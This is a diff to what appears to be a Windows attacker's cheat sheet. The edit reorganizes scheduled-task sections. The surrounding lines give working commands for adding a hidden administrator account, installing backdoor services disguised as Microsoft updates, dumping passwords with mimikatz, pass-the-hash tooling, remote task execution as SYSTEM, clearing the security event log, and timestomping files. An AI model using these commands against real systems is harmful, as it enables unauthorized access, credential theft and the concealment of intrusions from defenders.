@@ -51,7 +51,19 @@ exploit
 net localgroup Users  
 net localgroup Administrators  
 net user sservice p@ssw0rd /add  
-net localgroup administrators sservice /add  
+net localgroup administrators sservice /add 
+  
+## Schtask
+AT \\REMOTECOMPUTERNAME 12:34 "command to run"  
+
+## schtask - create new schedule task
+schtasks /create /tn <taskname> /tr <taskrun> /sc <scheduleType MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE> /st <StartTime> /S <remote host> /RU <permissions of the specified user account>  
+schtasks /create /tn foobar /tr c:\wiSndows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
+schtasks /F /delete /tn foobar /S host  
+schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
+schtasks /run /tn foobar /S host  
+delete schedule task  
+schtasks /F /delete /tn foobar /S host  
 ## Install new service  
 sc create microsoft_update binpath= "cmd /K start c:\Windows\Temp\backdoor.exe" start= auto error= ignore /c C:\Windows\Temp\backdoor.exe  
 sc create Microsoft_Update binpath= "cmd /K start C:\Users\john.SECPLAYGROUND\Downloads\update.exe" start= "auto" DisplayName= "Windows Automatic updates"  
@@ -71,12 +83,7 @@ unzip mimikatz_trunk.zip
 (msf) session -i <id>  
 mimikatz.exe  
 (mimikatz) privilege::debug  
-(mimikatz) sekurlsa::logonPasswords full  
-## Schtask
-AT \\REMOTECOMPUTERNAME 12:34 "command to run"  
-schtasks /create /tn <taskname> /tr <taskrun> /sc <scheduleType MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE> /st <StartTime> /S <remote host> /RU <permissions of the specified user account>  
-schtasks /create /tn foobar /tr c:\wiSndows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
-schtasks /F /delete /tn foobar /S host  
+(mimikatz) sekurlsa::logonPasswords full
 
 ## Pass-the-hash
 git clone https://github.com/byt3bl33d3r/pth-toolkit  
@@ -120,12 +127,6 @@ wevtutil cl security
 ## Winrm
 PS> Enable-PSRemoting -Force  
 winrm quickconfig  
-
-## schtask - create new schedule task
-schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
-schtasks /run /tn foobar /S host  
-delete schedule task  
-schtasks /F /delete /tn foobar /S host  
 
 ## Timestomp
 (meterpreter) timestomp mimikatz.exe -v  
